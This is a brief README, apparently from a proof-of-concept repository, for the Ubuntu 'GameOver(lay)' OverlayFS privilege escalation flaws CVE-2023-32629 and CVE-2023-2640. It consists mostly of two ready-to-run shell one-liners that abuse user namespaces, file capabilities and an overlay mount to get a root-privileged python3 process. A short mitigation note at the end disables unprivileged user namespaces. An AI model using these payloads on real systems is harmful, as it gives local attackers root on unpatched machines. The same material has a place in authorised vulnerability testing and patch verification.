# Ubuntu GameOver(lay) Local Privilege Escalation CVE-2023–32629 & CVE-2023–2640

## original poc payload
```
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("id")'
```
## adjusted poc payload; likely false positive
```
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*; u/python3 -c 'import os;os.setuid(0);os.system(\"id\")'"
```


### note
If you are unable to upgrade your kernel version or Ubuntu distro, you can alternatively adjust the permissions and deny low priv users from using the OverlayFS feature.
change permissions on the fly, won't persist reboots
```
sudo sysctl -w kernel.unprivileged_userns_clone=0
```
<br>
change permissions permanently; requires reboot
<br><br>

```
echo kernel.unprivileged_userns_clone=0 | sudo tee /etc/sysctl.d/99-disable-unpriv-userns.conf
```


<br><br><br>

==================================================================================
